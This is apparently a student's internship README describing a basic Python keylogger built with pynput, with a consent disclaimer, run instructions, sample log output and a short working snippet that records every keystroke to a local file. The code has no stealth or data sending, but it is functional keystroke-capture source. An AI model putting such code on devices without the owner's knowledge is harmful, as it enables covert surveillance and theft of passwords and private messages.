# ⌨️ SCT_CS_4 — Keylogger

> **SkillCraft Technology | Cyber Security Internship — Task 04**

---

## ⚠️ Disclaimer

> **This tool is built strictly for educational purposes as part of the SkillCraft Technology Cyber Security Internship.**
> It is designed to log only **your own keystrokes** on your own device.
> **Never use a keylogger on any device without explicit consent of the owner.** Unauthorized keystroke monitoring is illegal in most jurisdictions.

---

## 📌 Task Description

Create a **basic keylogger program** that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file.

---

## 📁 File Structure

```
SCT_CS_4/
├── keylogger_cli.py   # Command-Line Interface version
├── keylogger_gui.py   # Graphical User Interface version
├── keylog.txt         # Generated log file (created at runtime)
└── README.md          # Project documentation
```

---

## ⚙️ Requirements

- Python 3.x
- **pynput** library

```bash
pip install pynput
```

---

## 🚀 How to Run

### CLI Version
```bash
python keylogger_cli.py
```
> Press **ESC** to stop logging.

### GUI Version
```bash
python keylogger_gui.py
```

---

## 🖥️ Features

### CLI
| Feature | Description |
|---|---|
| Start Logging | Listens and logs all keystrokes |
| ESC to Stop | Cleanly stops the listener |
| View Log | Displays last 50 log entries |
| Clear Log | Wipes the log file |
| Session Header | Timestamps each session |


---

## 📸 Sample Log Output

```
========================================
SESSION: 2026-05-14 10:30:00
========================================
[10:30:01] KEY: h
[10:30:01] KEY: e
[10:30:01] KEY: l
[10:30:01] KEY: l
[10:30:01] KEY: o
[10:30:02] SPECIAL: space
[10:30:02] KEY: w
[10:30:02] KEY: o
[10:30:02] KEY: r
[10:30:02] KEY: l
[10:30:02] KEY: d
[10:30:04] SPECIAL: esc
⏹  Logging stopped (ESC pressed).
📄  Log saved to: keylog.txt
```

---

## 🔍 How It Works

```python
from pynput import keyboard

def on_press(key):
    try:
        # Regular character key
        entry = f"KEY: {key.char}"
    except AttributeError:
        # Special key (space, enter, backspace, etc.)
        entry = f"SPECIAL: {str(key).replace('Key.', '')}"
    # Write to file
    with open("keylog.txt", "a") as f:
        f.write(entry + "\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

- Uses `pynput.keyboard.Listener` to hook into keyboard events
- Regular keys are captured via `key.char`
- Special keys (Enter, Space, Backspace, etc.) are captured via `AttributeError` fallback
- Each entry is timestamped and appended to `keylog.txt`

---
## Output screenshot

<img width="986" height="901" alt="Screenshot 2026-05-15 033715" src="https://github.com/user-attachments/assets/9665d3c9-bf32-40b4-8e10-ea3872312d78" />


---

## 👩‍💻 Author

**Iqra Raheem**
Cyber Security Intern — SkillCraft Technology
Internship ID: SCT/MAY26/0435

---
